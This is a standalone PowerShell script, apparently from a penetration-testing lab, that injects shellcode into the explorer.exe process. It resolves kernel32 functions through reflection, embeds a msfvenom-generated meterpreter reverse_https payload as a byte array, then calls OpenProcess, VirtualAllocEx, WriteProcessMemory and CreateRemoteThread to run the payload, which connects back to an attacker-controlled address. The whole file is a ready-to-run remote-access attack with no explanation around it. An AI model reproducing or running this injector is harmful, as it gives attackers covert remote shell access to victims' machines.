function Local:Get-DelegateType
{
    Param
    (
        [OutputType([Type])]
            
        [Parameter( Position = 0)]
        [Type[]]
        $Parameters = (New-Object Type[](0)),
            
        [Parameter( Position = 1 )]
        [Type]
        $ReturnType = [Void]
    )

    $Domain = [AppDomain]::CurrentDomain
    $DynAssembly = New-Object System.Reflection.AssemblyName('ReflectedDelegate')
    $AssemblyBuilder = $Domain.DefineDynamicAssembly($DynAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
    $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('InMemoryModule', $false)
    $TypeBuilder = $ModuleBuilder.DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
    $ConstructorBuilder = $TypeBuilder.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $Parameters)
    $ConstructorBuilder.SetImplementationFlags('Runtime, Managed')
    $MethodBuilder = $TypeBuilder.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $ReturnType, $Parameters)
    $MethodBuilder.SetImplementationFlags('Runtime, Managed')
        
    Write-Output $TypeBuilder.CreateType()
}
function Local:Get-ProcAddress
{
    Param
    (
        [OutputType([IntPtr])]
        
        [Parameter( Position = 0, Mandatory = $True )]
        [String]
        $Module,
            
        [Parameter( Position = 1, Mandatory = $True )]
        [String]
        $Procedure
    )
        
    $SystemAssembly = [AppDomain]::CurrentDomain.GetAssemblies() |
    Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }
    $UnsafeNativeMethods = $SystemAssembly.GetType('Microsoft.Win32.UnsafeNativeMethods')
    $GetModuleHandle = $UnsafeNativeMethods.GetMethod('GetModuleHandle')
    $GetProcAddress = $UnsafeNativeMethods.GetMethod('GetProcAddress', [reflection.bindingflags] "Public,Static", $null, [System.Reflection.CallingConventions]::Any, @((New-Object System.Runtime.InteropServices.HandleRef).GetType(), [string]), $null);
    $Kern32Handle = $GetModuleHandle.Invoke($null, @($Module))
    $tmpPtr = New-Object IntPtr
    $HandleRef = New-Object System.Runtime.InteropServices.HandleRef($tmpPtr, $Kern32Handle)
    Write-Output $GetProcAddress.Invoke($null, @([System.Runtime.InteropServices.HandleRef]$HandleRef, $Procedure))
}

$procId = (Get-Process explorer).Id

# msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.49.67 LPORT=443 EXITFUNC=thread -f ps1
[Byte[]] $buf = 0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xcc,0x0,0x0,0x0,0x41,0x51,0x41,0x50,0x52,0x48,0x31,0xd2,0x51,0x56,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x48,0x8b,0x52,0x20,0x4d,0x31,0xc9,0x48,0x8b,0x72,0x50,0x48,0xf,0xb7,0x4a,0x4a,0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x2,0x2c,0x20,0x41,0xc1,0xc9,0xd,0x41,0x1,0xc1,0xe2,0xed,0x52,0x41,0x51,0x48,0x8b,0x52,0x20,0x8b,0x42,0x3c,0x48,0x1,0xd0,0x66,0x81,0x78,0x18,0xb,0x2,0xf,0x85,0x72,0x0,0x0,0x0,0x8b,0x80,0x88,0x0,0x0,0x0,0x48,0x85,0xc0,0x74,0x67,0x48,0x1,0xd0,0x44,0x8b,0x40,0x20,0x50,0x8b,0x48,0x18,0x49,0x1,0xd0,0xe3,0x56,0x48,0xff,0xc9,0x4d,0x31,0xc9,0x41,0x8b,0x34,0x88,0x48,0x1,0xd6,0x48,0x31,0xc0,0x41,0xc1,0xc9,0xd,0xac,0x41,0x1,0xc1,0x38,0xe0,0x75,0xf1,0x4c,0x3,0x4c,0x24,0x8,0x45,0x39,0xd1,0x75,0xd8,0x58,0x44,0x8b,0x40,0x24,0x49,0x1,0xd0,0x66,0x41,0x8b,0xc,0x48,0x44,0x8b,0x40,0x1c,0x49,0x1,0xd0,0x41,0x8b,0x4,0x88,0x41,0x58,0x48,0x1,0xd0,0x41,0x58,0x5e,0x59,0x5a,0x41,0x58,0x41,0x59,0x41,0x5a,0x48,0x83,0xec,0x20,0x41,0x52,0xff,0xe0,0x58,0x41,0x59,0x5a,0x48,0x8b,0x12,0xe9,0x4b,0xff,0xff,0xff,0x5d,0x48,0x31,0xdb,0x53,0x49,0xbe,0x77,0x69,0x6e,0x69,0x6e,0x65,0x74,0x0,0x41,0x56,0x48,0x89,0xe1,0x49,0xc7,0xc2,0x4c,0x77,0x26,0x7,0xff,0xd5,0x53,0x53,0x48,0x89,0xe1,0x53,0x5a,0x4d,0x31,0xc0,0x4d,0x31,0xc9,0x53,0x53,0x49,0xba,0x3a,0x56,0x79,0xa7,0x0,0x0,0x0,0x0,0xff,0xd5,0xe8,0xe,0x0,0x0,0x0,0x31,0x39,0x32,0x2e,0x31,0x36,0x38,0x2e,0x34,0x39,0x2e,0x38,0x38,0x0,0x5a,0x48,0x89,0xc1,0x49,0xc7,0xc0,0xbb,0x1,0x0,0x0,0x4d,0x31,0xc9,0x53,0x53,0x6a,0x3,0x53,0x49,0xba,0x57,0x89,0x9f,0xc6,0x0,0x0,0x0,0x0,0xff,0xd5,0xe8,0xdf,0x0,0x0,0x0,0x2f,0x48,0x79,0x62,0x4f,0x37,0x41,0x77,0x54,0x63,0x31,0x6b,0x73,0x78,0x79,0x33,0x46,0x54,0x6b,0x66,0x45,0x52,0x77,0x4c,0x76,0x73,0x44,0x44,0x4e,0x38,0x75,0x76,0x71,0x56,0x57,0x57,0x65,0x33,0x67,0x30,0x4f,0x57,0x71,0x69,0x6b,0x59,0x68,0x73,0x78,0x47,0x67,0x30,0x54,0x6a,0x66,0x31,0x34,0x6f,0x45,0x44,0x74,0x35,0x6b,0x77,0x37,0x4e,0x36,0x67,0x52,0x4b,0x79,0x72,0x39,0x72,0x58,0x38,0x70,0x63,0x55,0x75,0x47,0x55,0x34,0x58,0x78,0x72,0x55,0x4a,0x6b,0x4e,0x5f,0x52,0x50,0x4b,0x64,0x70,0x50,0x30,0x2d,0x41,0x4f,0x61,0x6b,0x6b,0x50,0x35,0x4d,0x4d,0x74,0x57,0x4c,0x62,0x36,0x35,0x5f,0x63,0x50,0x79,0x71,0x32,0x4e,0x79,0x70,0x33,0x62,0x58,0x72,0x43,0x37,0x46,0x4b,0x79,0x7a,0x67,0x41,0x59,0x76,0x32,0x44,0x41,0x45,0x65,0x70,0x42,0x61,0x30,0x32,0x6b,0x33,0x50,0x49,0x61,0x33,0x73,0x43,0x6b,0x72,0x6d,0x7a,0x49,0x56,0x38,0x65,0x46,0x32,0x74,0x33,0x4d,0x30,0x6e,0x49,0x70,0x6e,0x36,0x67,0x4d,0x6e,0x70,0x72,0x62,0x61,0x6a,0x74,0x49,0x6f,0x6b,0x59,0x70,0x78,0x6f,0x57,0x36,0x5a,0x6e,0x55,0x46,0x5a,0x59,0x50,0x67,0x6f,0x33,0x30,0x59,0x6d,0x52,0x49,0x52,0x76,0x62,0x4b,0x75,0x30,0x32,0x31,0x66,0x48,0x52,0x63,0x65,0x4f,0x32,0x0,0x48,0x89,0xc1,0x53,0x5a,0x41,0x58,0x4d,0x31,0xc9,0x53,0x48,0xb8,0x0,0x32,0xa8,0x84,0x0,0x0,0x0,0x0,0x50,0x53,0x53,0x49,0xc7,0xc2,0xeb,0x55,0x2e,0x3b,0xff,0xd5,0x48,0x89,0xc6,0x6a,0xa,0x5f,0x48,0x89,0xf1,0x6a,0x1f,0x5a,0x52,0x68,0x80,0x33,0x0,0x0,0x49,0x89,0xe0,0x6a,0x4,0x41,0x59,0x49,0xba,0x75,0x46,0x9e,0x86,0x0,0x0,0x0,0x0,0xff,0xd5,0x4d,0x31,0xc0,0x53,0x5a,0x48,0x89,0xf1,0x4d,0x31,0xc9,0x4d,0x31,0xc9,0x53,0x53,0x49,0xc7,0xc2,0x2d,0x6,0x18,0x7b,0xff,0xd5,0x85,0xc0,0x75,0x1f,0x48,0xc7,0xc1,0x88,0x13,0x0,0x0,0x49,0xba,0x44,0xf0,0x35,0xe0,0x0,0x0,0x0,0x0,0xff,0xd5,0x48,0xff,0xcf,0x74,0x2,0xeb,0xaa,0xe8,0x55,0x0,0x0,0x0,0x53,0x59,0x6a,0x40,0x5a,0x49,0x89,0xd1,0xc1,0xe2,0x10,0x49,0xc7,0xc0,0x0,0x10,0x0,0x0,0x49,0xba,0x58,0xa4,0x53,0xe5,0x0,0x0,0x0,0x0,0xff,0xd5,0x48,0x93,0x53,0x53,0x48,0x89,0xe7,0x48,0x89,0xf1,0x48,0x89,0xda,0x49,0xc7,0xc0,0x0,0x20,0x0,0x0,0x49,0x89,0xf9,0x49,0xba,0x12,0x96,0x89,0xe2,0x0,0x0,0x0,0x0,0xff,0xd5,0x48,0x83,0xc4,0x20,0x85,0xc0,0x74,0xb2,0x66,0x8b,0x7,0x48,0x1,0xc3,0x85,0xc0,0x75,0xd2,0x58,0xc3,0x58,0x6a,0x0,0x59,0xbb,0xe0,0x1d,0x2a,0xa,0x41,0x89,0xda,0xff,0xd5

$OpenProcessAddr = Get-ProcAddress kernel32.dll OpenProcess
$OpenProcessDelegate = Get-DelegateType @([UInt32], [UInt32], [UInt32]) ([IntPtr])
$hProcess = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($OpenProcessAddr, $OpenProcessDelegate).Invoke(0x001F0FFF, 0, $procId)

$VirtualAllocExAddr = Get-ProcAddress kernel32.dll VirtualAllocEx
$VirtualAllocExDelegate = Get-DelegateType  @([IntPtr], [IntPtr], [UInt32], [UInt32], [UInt32])([IntPtr])
$BaseAddr = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualAllocExAddr,$VirtualAllocExDelegate).Invoke($hProcess, [IntPtr]::Zero, [UInt32]$buf.Length, 0x3000, 0x40)

$WriteProcessMemoryAddr = Get-ProcAddress kernel32.dll WriteProcessMemory
$WriteProcessMemoryDelegate = Get-DelegateType @([IntPtr], [IntPtr], [Byte[]], [UInt32], [IntPtr]) ([Bool])
$SUCCESS = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($WriteProcessMemoryAddr,$WriteProcessMemoryDelegate).Invoke($hProcess, $BaseAddr, $buf, [Uint32]$buf.Length, [IntPtr]::Zero)

$CreateRemoteThreadAddr = Get-ProcAddress kernel32 CreateRemoteThread
$CreateRemoteThreadDelegate = Get-DelegateType @([IntPtr], [IntPtr], [UInt32], [IntPtr], [UInt32], [IntPtr])
$SUCCESS = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($CreateRemoteThreadAddr,$CreateRemoteThreadDelegate).Invoke($hProcess, [IntPtr]::Zero, 0, $BaseAddr, 0, [IntPtr]::Zero)
